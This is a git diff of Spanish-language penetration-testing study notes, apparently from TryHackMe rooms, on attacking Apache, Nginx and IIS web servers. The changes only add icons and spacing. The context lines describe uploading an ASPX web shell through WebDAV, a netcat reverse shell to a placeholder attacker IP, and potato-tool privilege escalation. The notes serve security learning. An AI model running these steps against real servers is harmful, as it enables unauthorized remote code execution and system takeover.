@@ -32,7 +32,7 @@
 <br>
 
 <h2>
-  <img src="" width="60px" align="absmiddle">
+  <img src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1778746486881" width="60px" align="absmiddle">
   <span> Descubrimiento de Contenido (Content Discovery)</span>
 </h2>
 
@@ -88,10 +88,9 @@ Gobuster permite realizar fuerza bruta sobre ambos entornos. Para descubrir subd
 <br>
 
 <h2>
-  <img src="" width="60px" align="absmiddle">
+  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1778596912702" width="60px" align="absmiddle">
   <span> Stacks Web Modernos (Modern Web Stacks)</span>
 </h2>
-## 2. Stacks Web Modernos (Modern Web Stacks)
 
 ### 2.1 Identificación y Huella Digital de Stacks Web
 Un stack o pila web es el conjunto de tecnologías compuestas por el sistema operativo, servidor web, base de datos, lenguaje backend y framework frontend que sustentan una aplicación. Durante una auditoría de seguridad de tiempo limitado, la velocidad de identificación de la pila web es un factor determinante. Descubrir la tecnología exacta y su versión permite al auditor dirigirse inmediatamente a los vectores de ataque y CVEs conocidos, evitando perder tiempo ejecutando escaneos genéricos.
@@ -143,10 +142,9 @@ Un atacante puede enviar una petición utilizando la secuencia `.%%32%65/` o `.%
 <br>
 
 <h2>
-  <img src="" width="60px" align="absmiddle">
+  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1777538452278" width="60px" align="absmiddle">
   <span> Ataques a Servidores Web I (Web Server Attacks - I)</span>
 </h2>
-## 3. Ataques a Servidores Web I (Web Server Attacks - I)
 
 ### 3.1 Identificación y Reconocimiento de Servidores Web
 La auditoría de servidores web orientada a la infraestructura Linux abarca tanto servidores de producción configurados formalmente como servicios web temporales o auxiliares desplegados por desarrolladores. El reconocimiento inicial debe diferenciar la arquitectura del servidor analizado entre Apache2, Nginx, servidores basados en entornos de ejecución como Node.js Express, y servidores HTTP integrados en lenguajes de programación como Python.
@@ -208,10 +206,9 @@ El escaneo automatizado de servidores web se complementa con herramientas como N
 <br>
 
 <h2>
-  <img src="" width="60px" align="absmiddle">
+  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1778159493675" width="60px" align="absmiddle">
   <span> Ataques a Servidores Web II (Web Server Attacks - II)</span>
 </h2>
-## 4. Ataques a Servidores Web II (Web Server Attacks - II)
 
 ### 4.1 Identificación y Arquitectura de Internet Information Services (IIS)
 Internet Information Services (IIS) es el servidor web propietario de Microsoft integrado en los sistemas operativos Windows Server. A diferencia de los servidores web independientes en entornos Linux, IIS está profundamente integrado con la arquitectura del sistema operativo Windows, la autenticación integrada (NTLM/Kerberos), el framework .NET y Active Directory, lo que convierte a un servidor IIS comprometido en la puerta de entrada ideal para ataques de pivoteamiento e infiltración en redes corporativas.
@@ -222,6 +219,8 @@ La arquitectura de IIS se sostiene sobre componentes clave que determinan la sup
 
 El reconocimiento inicial se completa ejecutando peticiones de captura de banners y verificando los métodos HTTP soportados mediante la petición `curl -X OPTIONS -v http://TARGET/`. La presencia de encabezados como `MS-Author-Via: DAV` o la inclusión de métodos como `PROPFIND`, `PROPPATCH`, `MKCOL`, `COPY` y `MOVE` confirma la presencia activa de la extensión WebDAV (Distributed Authoring and Versioning).
 
+<br>
+
 ### 4.2 Enumeración de Nombres Cortos de IIS (IIS Tilde / 8.3 Short Filename Enumeration)
 La vulnerabilidad de enumeración de nombres cortos de IIS (conocida como IIS Tilde Enumeration) es una falla de divulgación de información que surge por la compatibilidad heredada del sistema de archivos NTFS con el formato de nombres de archivo 8.3 de MS-DOS.
 
@@ -231,12 +230,16 @@ La vulnerabilidad en IIS radica en una diferencia de comportamiento del servidor
 
 Esta discrepancia permite a un auditor enumerar de manera automatizada los primeros 6 caracteres de todos los archivos y directorios ocultos presentes en el servidor web sin necesidad de adivinar palabras mediante diccionarios tradicionales. Para automatizar este ataque se utiliza la herramienta `iis_shortname_scan.py` mediante el comando `python3 iis_shortname_scan.py http://TARGET/`. Una vez descubiertos los nombres cortos (por ejemplo, `ADMINI~1` o `CONFIG~1.XML`), el auditor utiliza diccionarios enfocados para reconstruir el nombre largo completo y acceder directamente al recurso protegido.
 
+<br>
+
 ### 4.3 Explotación de WebDAV y Subida de Shells ASPX
 WebDAV es una extensión del protocolo HTTP que permite a los usuarios editar y gestionar archivos directamente en el servidor web remoto. Si WebDAV está habilitado sin controles de autenticación o con credenciales débiles, se convierte en un vector directo para obtener acceso inicial y ejecución remota de código.
 
 Para lograr una explotación exitosa y conseguir la ejecución de una shell web a través de WebDAV, deben cumplirse simultáneamente tres condiciones esenciales en la configuración del servidor IIS: primero, que el método HTTP `PUT` esté permitido en el servidor; segundo, que el directorio de destino tenga permisos de escritura habilitados para la cuenta anónima o el usuario autenticado; y tercero, que el directorio tenga permisos de ejecución habilitados para scripts ejecutable en el servidor (.NET / ASPX).
 
 El procedimiento de explotación comienza preparando un archivo de shell web escrito en ASPX. Una vez creado el archivo local `shell.aspx`, se sube al servidor WebDAV utilizando la herramienta `curl` mediante el comando `curl -T shell.aspx http://TARGET/webdav/shell.aspx` o utilizando clientes de línea de comandos especializados en WebDAV como `cadaver`. Si el servidor responde con un código `201 Created` o `200 OK`, la subida se ha realizado con éxito. Finalmente, el auditor navega hacia la URL `http://TARGET/webdav/shell.aspx` a través del navegador o `curl` para confirmar que el servidor interpreta el código .NET y ejecuta la shell.
+
+<br>
 
 ### 4.4 Shells Web ASPX y Escalada de Acceso
 Una shell web ASPX es un script escrito en C# o VB.NET diseñado para ejecutarse dentro del entorno de tiempo de ejecución de .NET en el servidor IIS. Al ser procesado por el proceso de trabajo `w3wp.exe`, el script recibe parámetros de entrada a través de peticiones HTTP, los ejecuta como comandos del sistema operativo subyacente y devuelve la salida en la respuesta web.
@@ -250,6 +253,8 @@ c.exe ATACANTE_IP 4444 -e cmd.exe`.
 El tercer paso consiste en verificar los privilegios asignados dentro de la shell inversa recibida. El auditor ejecuta `whoami /priv` para inspeccionar los privilegios de token de la cuenta de usuario. La presencia de privilegios como `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` permite ejecutar de manera inmediata herramientas de escalada de privilegios locales como PrintSpoofer, RoguePotato o JuicyPotato para elevar el acceso directamente a la cuenta `NT AUTHORITY\SYSTEM`.
 
 En el panorama real de amenazas, actores de ciberespionaje avanzados utilizan shells web ASPX highly optimizadas como China Chopper, la cual consta de una sola línea de código .NET capaz de recibir y evaluar bloques de código C# arbitrarios enviados en el cuerpo de peticiones POST HTTP.
+
+<br>
 
 ### 4.5 Configuraciones Erróneas Específicas de IIS
 Los servidores IIS presentan un conjunto recurrente de configuraciones erróneas que exponen la infraestructura sin necesidad de utilizar exploits complejos.
@@ -267,6 +272,8 @@ La quinta es la exposición del endpoint de depuración `trace.axd`. Cuando el r
 La sexta es la activación del método HTTP `TRACE`, el cual devuelve en el cuerpo de la respuesta la petición exacta enviada por el cliente, facilitando ataques de Cross-Site Tracing (XST) para robar cookies protegidas bajo la bandera `HttpOnly`.
 
 La séptima es la ejecución del pool de aplicaciones (AppPool) bajo identidades con privilegios elevados, como la cuenta `Local System` o un usuario Administrador del Dominio, provocando que cualquier vulnerabilidad de ejecución de código en la aplicación web otorgue acceso total inmediato sobre el servidor o el dominio de Active Directory.
+
+<br>
 
 ### 4.6 Automatización y Scripts NSE para IIS
 El análisis de seguridad en servidores IIS se automatiza eficazmente mediante el motor de scripts de Nmap (NSE). El auditor puede ejecutar escaneos coordinados para detectar la versión precisa, enumerar métodos HTTP, identificar directorios WebDAV y comprobar la vulnerabilidad de nombres cortos 8.3 utilizando la siguiente sintaxis de comando: `nmap -sV --script http-vhosts,http-methods,http-webdav-scan,http-iis-short-name -p 80,443 TARGET`.
